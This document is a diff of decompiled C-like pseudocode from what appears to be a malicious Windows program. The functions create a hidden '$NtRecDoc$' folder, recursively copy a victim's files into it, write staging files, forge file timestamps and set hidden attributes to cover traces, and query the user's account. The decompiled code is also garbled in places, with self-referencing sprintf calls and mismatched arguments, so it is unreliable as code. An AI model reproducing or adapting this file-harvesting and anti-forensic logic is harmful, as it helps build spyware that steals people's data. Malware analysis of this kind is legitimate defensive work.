+    g2 = (int32_t)lpFindFileData2;
+    return result;
+}
+
+// Address range: 0x4040c4 - 0x404140
+int32_t function_4040c4(void) {
+    int32_t v1 = g2; // 0x4040c4
+    int32_t v2 = v1; // bp-4
+    g2 = &v2;
+    int32_t lpBuffer; // bp-516
+    int32_t v3 = &lpBuffer; // 0x4040c7
+    g63 = 79;
+    function_403e89(v1);
+    GetWindowsDirectoryA((char *)&lpBuffer, 512);
+    strcat((char *)&lpBuffer, "\\$NtRecDoc$");
+    CreateDirectoryA((char *)&lpBuffer, NULL);
+    int32_t v4 = GetFileAttributesA((char *)&lpBuffer); // 0x404114
+    SetFileAttributesA((char *)&lpBuffer, v4 | 2);
+    int32_t result = function_404140((struct _WIN32_FIND_DATAA *)*(int32_t *)&g33, v3); // 0x404137
+    g4 = v3;
+    g2 = v2;
+    return result;
+}
+
+// Address range: 0x404140 - 0x404354
+int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
+    struct _WIN32_FIND_DATAA * lpFindFileData2 = (struct _WIN32_FIND_DATAA *)g2; // bp-4
+    g2 = (int32_t)&lpFindFileData2;
+    int32_t v1; // bp-3672
+    int32_t v2 = &v1; // 0x404143
+    int32_t v3 = g5; // bp-3684
+    int32_t v4; // 0x40434f
+    int32_t result; // 0x404353
+    if (g26 != 0) {
+        // 0x40433f
+        v4 = &v3;
+        result = 0;
+        // branch -> 0x40434f
+    } else {
+        int32_t v5 = (int32_t)a1;
+        int32_t str; // bp-2648
+        sprintf((char *)&str, "%s\\*.*", a1);
+        char lpFindFileData; // bp-344
+        int32_t v6 = &lpFindFileData; // 0x404173
+        int32_t * hFindFile = FindFirstFileA((char *)&str, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x404181
+        int32_t v7 = (int32_t)hFindFile; // 0x404181
+        int32_t v8; // 0x40434c
+        if (hFindFile != (int32_t *)-1) {
+            // 0x404193
+            g5 = (int32_t)"%s\\%s";
+            int32_t v9; // bp-600
+            int32_t v10 = &v9; // 0x4041c0
+            int32_t v11; // bp-856
+            int32_t v12 = &v11; // 0x40428f
+            int32_t v13; // bp-2136
+            int32_t v14 = &v13; // 0x40430a
+            int32_t v15; // bp-1112
+            int32_t v16 = &v15; // 0x4041e1
+            int32_t v17; // bp-3160
+            int32_t v18 = &v17; // 0x404212
+            int32_t v19; // bp-1624
+            int32_t v20 = &v19; // 0x404226
+            *(int32_t *)(g8 - 4) = v6;
+            *(int32_t *)(g8 - 8) = v7;
+            if (FindNextFileA(hFindFile, lpFindFileData2)) {
+                while (true) {
+                    // 0x4041b0
+                    char v21; // bp-300
+                    int32_t v22; // 0x40419e
+                    if (v21 != 46) {
+                        // 0x4041b9
+                        *(int32_t *)(g8 - 4) = (int32_t)&v21;
+                        *(int32_t *)(g8 - 8) = v10;
+                        strcpy((char *)hFindFile, (char *)lpFindFileData2);
+                        int32_t * v23 = (int32_t *)(g8 + 4); // 0x4041d4
+                        int32_t * str2;
+                        if ((lpFindFileData & 16) == 0) {
+                            // 0x40426b
+                            int32_t v24; // bp-24
+                            *v23 = (int32_t)&v24;
+                            GetLocalTime((struct _SYSTEMTIME *)hFindFile);
+                            *(int32_t *)(g8 - 4) = g73;
+                            uint16_t v25;
+                            *(int32_t *)(g8 - 8) = (int32_t)v25;
+                            uint16_t v26;
+                            *(int32_t *)(g8 - 12) = (int32_t)v26;
+                            uint16_t v27;
+                            *(int32_t *)(g8 - 16) = (int32_t)v27;
+                            uint16_t v28;
+                            *(int32_t *)(g8 - 20) = (int32_t)v28;
+                            *(int32_t *)(g8 - 24) = (int32_t)"%02u%02u%02u%02u%05d";
+                            *(int32_t *)(g8 - 28) = v12;
+                            sprintf((char *)&str2, (char *)&str2);
+                            int32_t v29 = g73; // 0x40429d
+                            int32_t v30 = v29 + 1;
+                            if (v29 > 0x1869f) {
+                                // 0x4042b2
+                                v30 = 0;
+                                // branch -> 0x4042b9
+                            }
+                            // 0x4042b9
+                            g73 = v30;
+                            *(int32_t *)(g8 + 24) = 46;
+                            *(int32_t *)(g8 + 20) = v10;
+                            char * found_char_pos = strrchr((char *)hFindFile, (int32_t)lpFindFileData2); // 0x4042c2
+                            *(int32_t *)(g8 - 4) = v10;
+                            *(int32_t *)(g8 - 8) = v5;
+                            *(int32_t *)(g8 - 12) = g5;
+                            *(int32_t *)(g8 - 16) = v2;
+                            sprintf((char *)&str2, (char *)&str2);
+                            int32_t v31;
+                            if (found_char_pos != NULL) {
+                                // 0x4042fe
+                                *(int32_t *)(g8 + 20) = (int32_t)found_char_pos + 1;
+                                *(int32_t *)(g8 + 16) = v12;
+                                *(int32_t *)(g8 + 12) = a2;
+                                *(int32_t *)(g8 + 8) = (int32_t)"%s\\%s.%s";
+                                *(int32_t *)(g8 + 4) = v14;
+                                sprintf((char *)&str2, (char *)&str2);
+                                v31 = g8 + 20;
+                                // branch -> 0x40431b
+                            } else {
+                                // 0x4042e5
+                                *(int32_t *)(g8 + 20) = v12;
+                                *(int32_t *)(g8 + 16) = a2;
+                                *(int32_t *)(g8 + 12) = g5;
+                                *(int32_t *)(g8 + 8) = v14;
+                                sprintf((char *)&str2, (char *)&str2);
+                                v31 = g8 + 16;
+                                // branch -> 0x40431b
+                            }
+                            // 0x40431b
+                            *(int32_t *)(v31 - 4) = 0;
+                            *(int32_t *)(v31 - 8) = v14;
+                            *(int32_t *)(v31 - 12) = v2;
+                            CopyFileA((char *)hFindFile, (char *)lpFindFileData2, false);
+                            // branch -> 0x404198
+                        } else {
+                            // 0x4041db
+                            *v23 = g73;
+                            *(int32_t *)g8 = (int32_t)"%05d";
+                            *(int32_t *)(g8 - 4) = v16;
+                            sprintf((char *)&str2, (char *)&str2);
+                            int32_t v32 = g73; // 0x4041ef
+                            int32_t v33 = v32 + 1;
+                            if (v32 > 0x1869f) {
+                                // 0x404204
+                                v33 = 0;
+                                // branch -> 0x40420b
+                            }
+                            // 0x40420b
+                            g73 = v33;
+                            *(int32_t *)(g8 + 8) = v10;
+                            *(int32_t *)(g8 + 4) = v5;
+                            *(int32_t *)g8 = g5;
+                            *(int32_t *)(g8 - 4) = v18;
+                            sprintf((char *)&str2, (char *)&str2);
+                            *(int32_t *)(g8 - 4) = v16;
+                            *(int32_t *)(g8 - 8) = a2;
+                            *(int32_t *)(g8 - 12) = (int32_t)"%s\\$%s";
+                            *(int32_t *)(g8 - 16) = v20;
+                            sprintf((char *)&str2, (char *)&str2);
+                            *(int32_t *)(g8 + 28) = 0;
+                            *(int32_t *)(g8 + 24) = v20;
+                            CreateDirectoryA((char *)hFindFile, (struct _SECURITY_ATTRIBUTES *)lpFindFileData2);
+                            *(int32_t *)(g8 - 4) = v20;
+                            *(int32_t *)(g8 - 8) = v18;
+                            if (function_404140((struct _WIN32_FIND_DATAA *)hFindFile, (int32_t)lpFindFileData2) == 0) {
+                                // 0x404336
+                                *(int32_t *)(g8 + 4) = v7;
+                                FindClose(hFindFile);
+                                // branch -> 0x40433f
+                                // 0x40433f
+                                v4 = g8;
+                                // branch -> 0x40434f
+                                // 0x40434f
+                                g5 = *(int32_t *)v4;
+                                g7 = *(int32_t *)(v4 + 4);
+                                g3 = *(int32_t *)(v4 + 8);
+                                g2 = (int32_t)lpFindFileData2;
+                                return 0;
+                            }
+                        }
+                        // 0x404198
+                        v22 = g8;
+                        *(int32_t *)(v22 - 4) = v6;
+                        *(int32_t *)(v22 - 8) = v7;
+                        if (!FindNextFileA(hFindFile, lpFindFileData2)) {
+                            // break -> 0x404343
+                            break;
+                        }
+                        // continue -> 0x4041b0
+                        continue;
+                    }
+                    // 0x404198
+                    v22 = g8;
+                    *(int32_t *)(v22 - 4) = v6;
+                    *(int32_t *)(v22 - 8) = v7;
+                    if (!FindNextFileA(hFindFile, lpFindFileData2)) {
+                        // break -> 0x404343
+                        break;
+                    }
+                    // continue -> 0x4041b0
+                }
+                // 0x404343
+                *(int32_t *)(g8 - 4) = v7;
+                FindClose(hFindFile);
+                // branch -> 0x40434c
+                // 0x40434c
+                v8 = g8;
+                *(int32_t *)(v8 - 4) = 1;
+                v4 = v8;
+                // branch -> 0x40434f
+                // 0x40434f
+                g5 = *(int32_t *)v4;
+                g7 = *(int32_t *)(v4 + 4);
+                g3 = *(int32_t *)(v4 + 8);
+                g2 = (int32_t)lpFindFileData2;
+                return 1;
+            }
+            // 0x404343
+            *(int32_t *)(g8 - 4) = v7;
+            FindClose(hFindFile);
+            // branch -> 0x40434c
+        }
+        // 0x40434c
+        v8 = g8;
+        *(int32_t *)(v8 - 4) = 1;
+        v4 = v8;
+        result = 1;
+        // branch -> 0x40434f
+    }
+    // 0x40434f
+    g5 = *(int32_t *)v4;
+    g7 = *(int32_t *)(v4 + 4);
+    g3 = *(int32_t *)(v4 + 8);
+    g2 = (int32_t)lpFindFileData2;
+    return result;
+}
+
+// Address range: 0x404354 - 0x40439c
+int32_t function_404354(char * str, int32_t a2) {
+    int32_t v1 = g2; // bp-4
+    g2 = &v1;
+    int32_t v2 = g7; // 0x40435d
+    int32_t len = strlen(str); // 0x404361
+    g7 = len + 6;
+    int32_t v3 = len & -256 | a2 & 255; // bp-1028
+    int32_t str2 = 0; // bp-1023
+    strcpy((char *)&str2, str);
+    int32_t result = function_401f45((char *)&v3, g7); // 0x404391
+    g7 = v2;
+    g2 = v1;
+    return result;
+}
+
+// Address range: 0x40439c - 0x404511
+int32_t function_40439c(int32_t * a1, int32_t a2) {
+    int32_t offset = (int32_t)a1;
+    int32_t v1 = offset;
+    int32_t dwFileAttributes = g2; // bp-4
+    g2 = &dwFileAttributes;
+    g1 = 0x2008;
+    function_405a10();
+    g3 = 1;
+    char v2 = 83; // 0x4043f9
+    if (g31 != 83) {
+        // 0x4043bc
+        v2 = g31 == 89 ? 89 : 69;
+        // branch -> 0x4043d7
+    }
+    char v3 = v2; // bp-8204
+    g5 = 0;
+    char * lpFileName = (char *)a2;
+    int32_t * fileHandle = CreateFileA(lpFileName, -0x80000000, 3, NULL, 3, 128, NULL); // 0x4043ec
+    g7 = (int32_t)fileHandle;
+    int32_t v4; // 0x40450c
+    if (fileHandle == (int32_t *)-1) {
+        // 0x4043f9
+        int32_t result; // 0x404510
+        if (v2 != 89) {
+            // 0x404421
+            g63 = 85;
+            int32_t v5;
+            function_403e89(v5);
+            // branch -> 0x404460
+            // 0x404460
+            result = 0;
+            // branch -> 0x40450c
+        } else {
+            // 0x404402
+            int32_t * v6;
+            function_401f45((char *)6, (int32_t)&v6);
+            g4 = 6;
+            result = g3;
+            // branch -> 0x40450c
+        }
+        // 0x40450c
+        v4 = g8;
+        g5 = *(int32_t *)v4;
+        g7 = *(int32_t *)(v4 + 4);
+        g3 = *(int32_t *)(v4 + 8);
+        g2 = dwFileAttributes;
+        return result;
+    }
+    int32_t v7 = GetFileSize(fileHandle, (int32_t *)g5); // 0x404431
+    int32_t v8; // bp-56
+    int32_t v9 = &v8; // 0x404437
+    v8 = g7;
+    CloseHandle((int32_t *)(5 - offset + v7));
+    int32_t v10 = &v3; // 0x40444c
+    struct _IO_FILE * stream = (struct _IO_FILE *)&v3; // bp-64
+    int32_t v11 = function_401f45(&v3, 5); // 0x404455
+    g4 = 5;
+    if (v11 != 0) {
+        // 0x404467
+        *(int32_t *)&stream = a2;
+        struct _IO_FILE * file = fopen(lpFileName, "rb"); // 0x40446f
+        int32_t v12 = (int32_t)file; // 0x40446f
+        int32_t whence = g5; // 0x404475
+        fseek(file, offset, whence);
+        int32_t v13 = g5; // 0x404486
+        struct _IO_FILE * file2;
+        int32_t v14; // 0x4044f3
+        int32_t * v15; // 0x4044f3
+        if (g26 != v13) {
+            // 0x4044e0
+            file2 = (struct _IO_FILE *)v13;
+            // branch -> 0x4044e3
+            // 0x4044e3
+            *(int32_t *)(v9 - 4) = v12;
+            fclose(file2);
+            v14 = g8;
+            v15 = (int32_t *)v14;
+            g4 = *v15;
+            if (g31 == 65) {
+                // 0x4044f6
+                *v15 = g5;
+                *(int32_t *)(v14 - 4) = a2;
+                SetFileAttributesA((char *)file2, dwFileAttributes);
+                *(int32_t *)(g8 - 4) = a2;
+                DeleteFileA((char *)file2);
+                // branch -> 0x404509
+            }
+            // 0x404509
+            // branch -> 0x40450c
+            // 0x40450c
+            v4 = g8;
+            g5 = *(int32_t *)v4;
+            g7 = *(int32_t *)(v4 + 4);
+            g3 = *(int32_t *)(v4 + 8);
+            g2 = dwFileAttributes;
+            return (int32_t)file2;
+        }
+        // 0x40448e
+        g7 = 0x2000;
+        int32_t v16 = v9; // 0x404493
+        // branch -> 0x404493
+        int32_t v17; // 0x4044cd
+        int32_t v18; // 0x4044d8
+        while (true) {
+            // 0x404493
+            *(int32_t *)(v16 - 4) = v12;
+            *(int32_t *)(v16 - 8) = g7;
+            *(int32_t *)(v16 - 12) = 1;
+            *(int32_t *)(v16 - 16) = v10;
+            int32_t items_read = fread(&file->e0, offset, whence, stream); // 0x4044a0
+            *(int32_t *)(g8 - 4) = (int32_t)&v1;
+            *(int32_t *)(g8 - 8) = v10;
+            *(int32_t *)(g8 - 12) = g7;
+            *(int32_t *)(g8 - 16) = v10;
+            function_402830((int32_t)file, offset, (char *)whence, (int32_t)stream);
+            *(int32_t *)(g8 - 4) = items_read;
+            *(int32_t *)(g8 - 8) = v10;
+            int32_t v19 = function_401e99((int32_t)file, offset); // 0x4044c8
+            v17 = g8 + 40;
+            if (v19 == 0) {
+                // 0x404493
+                // branch -> 0x4044e0
+                // 0x4044e0
+                file2 = (struct _IO_FILE *)g5;
+                // branch -> 0x4044e3
+            } else {
+                // 0x4044d4
+                if (g3 == g7) {
+                    // 0x4044d8
+                    v18 = g5;
+                    if (g26 != v18) {
+                        // break -> 0x4044e0
+                        break;
+                    }
+                    v16 = v17;
+                    // continue -> 0x404493
+                    continue;
+                } else {
+                    file2 = (struct _IO_FILE *)1;
+                }
+            }
+            // 0x4044e3
+            *(int32_t *)(v17 - 4) = v12;
+            fclose(file2);
+            v14 = g8;
+            v15 = (int32_t *)v14;
+            g4 = *v15;
+            if (g31 == 65) {
+                // 0x4044f6
+                *v15 = g5;
+                *(int32_t *)(v14 - 4) = a2;
+                SetFileAttributesA((char *)file2, dwFileAttributes);
+                *(int32_t *)(g8 - 4) = a2;
+                DeleteFileA((char *)file2);
+                // branch -> 0x404509
+            }
+            // 0x404509
+            // branch -> 0x40450c
+            // 0x40450c
+            v4 = g8;
+            g5 = *(int32_t *)v4;
+            g7 = *(int32_t *)(v4 + 4);
+            g3 = *(int32_t *)(v4 + 8);
+            g2 = dwFileAttributes;
+            return (int32_t)file2;
+        }
+        // 0x4044e0
+        file2 = (struct _IO_FILE *)v18;
+        // branch -> 0x4044e3
+        // 0x4044e3
+        *(int32_t *)(v17 - 4) = v12;
+        fclose(file2);
+        v14 = g8;
+        v15 = (int32_t *)v14;
+        g4 = *v15;
+        if (g31 == 65) {
+            // 0x4044f6
+            *v15 = g5;
+            *(int32_t *)(v14 - 4) = a2;
+            SetFileAttributesA((char *)file2, dwFileAttributes);
+            *(int32_t *)(g8 - 4) = a2;
+            DeleteFileA((char *)file2);
+            // branch -> 0x404509
+        }
+        // 0x404509
+        // branch -> 0x40450c
+        // 0x40450c
+        v4 = g8;
+        g5 = *(int32_t *)v4;
+        g7 = *(int32_t *)(v4 + 4);
+        g3 = *(int32_t *)(v4 + 8);
+        g2 = dwFileAttributes;
+        return (int32_t)file2;
+    }
+    // 0x404460
+    // branch -> 0x40450c
+    // 0x40450c
+    v4 = g8;
+    g5 = *(int32_t *)v4;
+    g7 = *(int32_t *)(v4 + 4);
+    g3 = *(int32_t *)(v4 + 8);
+    g2 = dwFileAttributes;
+    return 0;
+}
+
+// Address range: 0x404511 - 0x404524
+int32_t function_404511(void) {
+    struct _NETRESOURCEA * v1 = g33; // 0x404511
+    int32_t v2 = (int32_t)v1 + 4; // 0x404516
+    g4 = v2;
+    int32_t result = function_40439c((int32_t *)v1->e0, v2); // 0x40451c
+    g4 = v2;
+    return result;
+}
+
+// Address range: 0x404524 - 0x404569
+int32_t function_404524(int32_t a1) {
+    // 0x404524
+    function_404354((char *)g33, 70);
+    g4 = 70;
+    if (WaitForSingleObject((int32_t *)g22, 0xea60) == 258) {
+        // 0x404568
+        return 258;
+    }
+    int32_t v1 = *(int32_t *)&g33; // 0x40454f2
+    function_403eae((struct _WIN32_FIND_DATAA *)v1, 0xea60);
+    g63 = 71;
+    return function_403e89(v1);
+}
+
+// Address range: 0x404569 - 0x4045cb
+int32_t function_404569(void) {
+    // 0x404569
+    g7 = (int32_t)&g70;
+    GetWindowsDirectoryA((char *)&g70, 255);
+    strcat((char *)g7, "\\ZJRsv.tem");
+    g5 = 0x683a;
+    g4 = (int32_t)"\\ZJRsv.tem";
+    char * lpFileName = (char *)g7; // 0x404590
+    DeleteFileA(lpFileName);
+    char * found_char_pos = strrchr((char *)*(int32_t *)&g33, 92); // 0x40459b
+    int32_t v1 = (int32_t)found_char_pos; // 0x40459b
+    g1 = v1;
+    function_403d8d(v1);
+    *found_char_pos = 0;
+    function_403eae((struct _WIN32_FIND_DATAA *)*(int32_t *)&g33, 89);
+    function_40439c(NULL, g7);
+    int32_t lpFileName2 = g7; // 0x4045c4
+    g7 = (int32_t)lpFileName;
+    g3 = (int32_t)(char *)&g70;
+    return DeleteFileA((char *)lpFileName2);
+}
+
+// Address range: 0x4045cb - 0x404629
+int32_t function_4045cb(void) {
+    struct _IO_FILE * file = fopen((char *)&g70, "ab"); // 0x4045d6
+    int32_t result; // 0x404628
+    if (file != NULL) {
+        // 0x4045e4
+        int32_t str;
+        fwrite((int32_t *)str, 1, strlen((char *)str) + 1, file);
+        int32_t v1;
+        fwrite((int32_t *)(v1 + 20), 1, 8, file);
+        fwrite((int32_t *)(v1 + 32), 1, 4, file);
+        g5 = (int32_t)(char *)g5;
+        result = fclose(file);
+        // branch -> 0x404627
+    } else {
+        result = (int32_t)file;
+    }
+    // 0x404627
+    return result;
+}
+
+// Address range: 0x404629 - 0x404655
+int32_t function_404629(void) {
+    // 0x404629
+    GetWindowsDirectoryA((char *)*(int32_t *)&g33, 512);
+    strcat((char *)*(int32_t *)&g33, "X JpQjejop]hhG>5,,3.3 ");
+    return function_404524(79);
+}
+
+// Address range: 0x404655 - 0x4047d2
+int32_t function_404655(void) {
+    int32_t size = g2; // bp-4
+    g2 = &size;
+    int32_t v1 = 0; // ebx
+    int32_t v2 = g5; // bp-280
+    int32_t v3 = &v2; // 0x404668
+    int32_t nmemb;
+    char * v4; // bp-288
+    struct _WIN32_FIND_DATAA * file3; // bp-8
+    int32_t v5;
+    int32_t v6; // 0x4047b7
+    int32_t v7; // 0x4047c3
+    int32_t v8; // 0x4047cc
+    int32_t v9; // 0x4047cd
+    int32_t result; // 0x4047d1
+    int32_t v10; // 0x40477a
+    int32_t v11; // 0x404783
+    int32_t * v12; // 0x4047c3
+    int32_t v13; // 0x404774
+    int32_t v14; // 0x404791
+    int32_t v15; // 0x4047c7
+    int32_t * stream;
+    if (g27 != 0) {
+        // 0x40473a
+        g7 = (int32_t)&g21;
+        v4 = (char *)&g21;
+        struct _IO_FILE * file = fopen((char *)&g21, "ab"); // 0x404745
+        g3 = (int32_t)file;
+        if (file != NULL) {
+            // 0x404769
+            g5 = (int32_t)g33;
+            v10 = v3;
+            v5 = (int32_t)g30;
+            // branch -> 0x404774
+            // 0x404774
+            v13 = (int32_t)&file3;
+            g4 = v13;
+            file3 = (struct _WIN32_FIND_DATAA *)v5;
+            *(int32_t *)(v10 - 4) = v13;
+            *(int32_t *)(v10 - 8) = g5;
+            *(int32_t *)(v10 - 12) = v5;
+            *(int32_t *)(v10 - 16) = g5;
+            nmemb = 0;
+            function_402830((int32_t)file3, size, (char *)nmemb, (int32_t)&stream);
+            v11 = g8;
+            *(int32_t *)(v11 - 4) = g3;
+            *(int32_t *)(v11 - 8) = (int32_t)file3;
+            *(int32_t *)(v11 - 12) = 1;
+            *(int32_t *)(v11 - 16) = g5;
+            fwrite(&file3->e0, size, nmemb, (struct _IO_FILE *)&stream);
+            *(int32_t *)(g8 - 4) = g3;
+            v14 = fclose((struct _IO_FILE *)file3);
+            if (g57 != 0) {
+                // 0x4047a3
+                g57 = 0;
+                g63 = 79;
+                function_403e89((int32_t)file3);
+                *(int32_t *)(g8 - 4) = g7;
+                v6 = function_4047d2();
+                v7 = g8;
+                v12 = (int32_t *)v7;
+                g4 = *v12;
+                if (g31 == 86) {
+                    // 0x4047c6
+                    *v12 = g7;
+                    v15 = function_40511a((char *)file3);
+                    v8 = g8;
+                    g4 = *(int32_t *)v8;
+                    result = v15;
+                    v9 = v8 + 4;
+                    // branch -> 0x4047cd
+                } else {
+                    result = v6;
+                    v9 = v7 + 4;
+                }
+            } else {
+                result = v14;
+                v9 = g8 + 36;
+            }
+        } else {
+            // 0x404753
+            fclose(file);
+            // branch -> 0x40475b
+            // 0x40475b
+            g63 = 69;
+            result = function_403e89((int32_t)(struct _NETRESOURCEA *)file);
+            v9 = g8;
+            // branch -> 0x4047cd
+        }
+        // 0x4047cd
+        g7 = *(int32_t *)(v9 + 4);
+        g3 = *(int32_t *)(v9 + 8);
+        g2 = size;
+        return result;
+    }
+    // 0x40466f
+    g27 = 1;
+    int32_t str = (int32_t)g33 + 4; // 0x40467e
+    int32_t len = strlen((char *)str); // 0x404682
+    g5 = len;
+    g4 = str;
+    if (len >= 276) {
+        v9 = v3;
+        // 0x4047cd
+        g7 = *(int32_t *)(v9 + 4);
+        g3 = *(int32_t *)(v9 + 8);
+        g2 = size;
+        return len;
+    }
+    // 0x404699
+    g7 = (int32_t)&g21;
+    int32_t str2 = (int32_t)g33 + 4; // 0x4046a3
+    struct _NETRESOURCEA * v16 = (struct _NETRESOURCEA *)str2; // bp-284
+    v4 = (char *)&g21;
+    strcpy((char *)&g21, (char *)str2);
+    int32_t v17 = v3; // 0x4046f8
+    char * dwFileAttributes;
+    char * str3; // 0x4046ef
+    if (g31 == 86) {
+        int32_t v18 = (int32_t)&v4; // 0x4046a7
+        v16 = (struct _NETRESOURCEA *)256;
+        int32_t lpBuffer; // bp-268
+        v4 = (char *)&lpBuffer;
+        GetWindowsDirectoryA((char *)&lpBuffer, 256);
+        strcat((char *)&lpBuffer, g13);
+        strcat((char *)&lpBuffer, (char *)g7);
+        str3 = (char *)g7;
+        strcpy(str3, (char *)&lpBuffer);
+        dwFileAttributes = (char *)&lpBuffer;
+        v17 = v18;
+        // branch -> 0x4046f8
+    }
+    // 0x4046f8
+    *(int32_t *)(v17 - 4) = v1;
+    *(int32_t *)(v17 - 8) = g7;
+    SetFileAttributesA(str3, (int32_t)dwFileAttributes);
+    int32_t v19 = g33->e0; // 0x404705
+    int32_t v20 = v19 == v1 ? (int32_t)"wb" : (int32_t)"ab";
+    *(int32_t *)(g8 - 4) = v20;
+    *(int32_t *)(g8 - 8) = g7;
+    struct _IO_FILE * file2 = fopen(str3, dwFileAttributes); // 0x404716
+    g3 = (int32_t)file2;
+    if (file2 == NULL) {
+        // 0x4046f8
+        // branch -> 0x40475b
+        // 0x40475b
+        g63 = 69;
+        result = function_403e89((int32_t)v16);
+        v9 = g8;
+        // branch -> 0x4047cd
+    } else {
+        // 0x404724
+        g5 += (int32_t)g33 + 5;
+        v10 = g8 + 8;
+        v5 = (int32_t)g30 - len - 5;
+        // branch -> 0x404774
+        // 0x404774
+        v13 = (int32_t)&file3;
+        g4 = v13;
+        file3 = (struct _WIN32_FIND_DATAA *)v5;
+        *(int32_t *)(v10 - 4) = v13;
+        *(int32_t *)(v10 - 8) = g5;
+        *(int32_t *)(v10 - 12) = v5;
+        *(int32_t *)(v10 - 16) = g5;
+        function_402830((int32_t)file3, size, (char *)nmemb, (int32_t)&stream);
+        v11 = g8;
+        *(int32_t *)(v11 - 4) = g3;
+        *(int32_t *)(v11 - 8) = (int32_t)file3;
+        *(int32_t *)(v11 - 12) = 1;
+        *(int32_t *)(v11 - 16) = g5;
+        fwrite(&file3->e0, size, nmemb, (struct _IO_FILE *)&stream);
+        *(int32_t *)(g8 - 4) = g3;
+        v14 = fclose((struct _IO_FILE *)file3);
+        if (g57 != 0) {
+            // 0x4047a3
+            g57 = 0;
+            g63 = 79;
+            function_403e89((int32_t)file3);
+            *(int32_t *)(g8 - 4) = g7;
+            v6 = function_4047d2();
+            v7 = g8;
+            v12 = (int32_t *)v7;
+            g4 = *v12;
+            if (g31 == 86) {
+                // 0x4047c6
+                *v12 = g7;
+                v15 = function_40511a((char *)file3);
+                v8 = g8;
+                g4 = *(int32_t *)v8;
+                result = v15;
+                v9 = v8 + 4;
+                // branch -> 0x4047cd
+            } else {
+                result = v6;
+                v9 = v7 + 4;
+            }
+        } else {
+            result = v14;
+            v9 = g8 + 36;
+        }
+    }
+    // 0x4047cd
+    g7 = *(int32_t *)(v9 + 4);
+    g3 = *(int32_t *)(v9 + 8);
+    g2 = size;
+    return result;
+}
+
+// Address range: 0x4047d2 - 0x404889
+int32_t function_4047d2(void) {
     int32_t v1 = g2; // 0x4047d2
-    int32_t v2 = g5; // 0x4047dd
     int32_t lpBuffer = 0; // bp-1040
     GetWindowsDirectoryA((char *)&lpBuffer, 1024);
     int32_t dwShareMode = 0; // edi
     int32_t * fileHandle = CreateFileA((char *)&lpBuffer, -0x80000000, 5, NULL, 3, 0x2000000, NULL); // 0x40480f
     if (fileHandle == (int32_t *)-1) {
         // 0x404884
-        g5 = v2;
+        g7 = *(int32_t *)(g8 + 4);
         g2 = v1;
         return (int32_t)fileHandle;
     }
-    int32_t * fileHandle2 = CreateFileA((char *)lpFileName, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 3, 128, &((struct _FILETIME *)dwShareMode)->e0); // 0x40482b
-    int32_t v3 = (int32_t)fileHandle2; // ebx
-    int32_t handleClosed; // 0x40487e
+    // 0x404819
+    int32_t v2;
+    char * lpFileName = (char *)v2; // 0x404828
+    int32_t * fileHandle2 = CreateFileA(lpFileName, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 3, 128, (int32_t *)dwShareMode); // 0x40482b
+    int32_t hFile = (int32_t)fileHandle2; // ebx
+    int32_t handleClosed; // 0x404888
     if (fileHandle2 != (int32_t *)-1) {
         struct _FILETIME * lpLastAccessTime = (struct _FILETIME *)dwShareMode; // 0x40483f
         int32_t lpCreationTime = 0; // bp-16
         GetFileTime(fileHandle, (struct _FILETIME *)&lpCreationTime, lpLastAccessTime, lpLastAccessTime);
-        SetFileTime(&((struct _SECURITY_ATTRIBUTES *)v3)->e0, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime);
+        SetFileTime((int32_t *)hFile, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime, (struct _FILETIME *)&lpCreationTime);
         CloseHandle(fileHandle);
-        CloseHandle(&((struct _FILETIME *)v3)->e0);
-        int32_t v4 = GetFileAttributesA((char *)lpFileName); // 0x404872
-        handleClosed = SetFileAttributesA((char *)lpFileName, v4 & 253 | 0x1000000 * v4 / 0x1000000 & -256 | 2);
+        CloseHandle((int32_t *)hFile);
+        int32_t v3 = GetFileAttributesA(lpFileName); // 0x404872
+        handleClosed = SetFileAttributesA(lpFileName, v3 | 2);
         // branch -> 0x404884
     } else {
         // 0x404834
@@ -4517,27 +7198,26 @@ int32_t function_4047d2(struct _FILETIME * lpFileName) {
         // branch -> 0x404884
     }
     // 0x404884
-    g5 = v2;
+    g7 = *(int32_t *)(g8 + 4);
     g2 = v1;
     return handleClosed;
 }
 
-// Address range: 0x404889 - 0x404904
+// Address range: 0x404889 - 0x404905
 int32_t function_404889(void) {
-    // 0x404889
-    int32_t ProcessHandle;
-    int32_t TokenHandle = ProcessHandle;
     int32_t v1 = g2; // bp-4
     int32_t cchName = 256; // bp-12
+    int32_t TokenHandle = 0;
     int32_t cchReferencedDomainName = 200; // bp-8
+    int32_t ProcessHandle;
     if (OpenProcessToken((int32_t *)ProcessHandle, 0x20008, (int32_t **)&TokenHandle)) {
         int32_t TokenInformation = 0; // bp-1220
         int32_t ReturnLength = 0; // bp-16
         if (GetTokenInformation((int32_t *)TokenHandle, 1, &TokenInformation, 1000, &ReturnLength)) {
             int32_t ReferencedDomainName = 0; // bp-220
             int32_t peUse = 0; // bp-20
-            char * Name;
-            bool result = LookupAccountSidA(NULL, (int32_t *)TokenInformation, Name, &cchName, (char *)&ReferencedDomainName, &cchReferencedDomainName, &peUse); // 0x4048f7
+            int32_t Name;
+            bool result = LookupAccountSidA(NULL, (int32_t *)TokenInformation, (char *)Name, &cchName, (char *)&ReferencedDomainName, &cchReferencedDomainName, &peUse); // 0x4048f7
             g2 = v1;
             return result;
         }
@@ -4550,410 +7230,498 @@ int32_t function_404889(void) {
     return 0;
 }
 
-// Address range: 0x404905 - 0x404b7f
+// Address range: 0x404905 - 0x404b80
 int32_t function_404905(void) {
     // 0x404905
     g1 = 0x4240;
     function_405a10();
+    char * hMem = (char *)g5; // bp-16
+    int32_t ** dwBytes; // bp-20
+    int32_t v1 = (int32_t)&dwBytes; // 0x404915
     g5 = 2;
     g3 = 0;
-    struct _NETRESOURCEA * lpcCount = NULL; // bp-24
-    *(int32_t *)&lpcCount = *(int32_t *)&g31;
-    char * lpNetResource = (char *)2; // bp-64
-    char * dwBytes = (char *)0x4000; // bp-20
-    char * v1 = (char *)71; // bp-16964
+    struct _NETRESOURCEA * v2 = NULL; // bp-24
+    *(int32_t *)&v2 = *(int32_t *)&g33;
+    int32_t v3 = (int32_t)&v2; // 0x404923
+    int32_t ** lpNetResource = (int32_t **)2; // bp-64
+    dwBytes = (int32_t **)0x4000;
+    char v4 = 71; // bp-16964
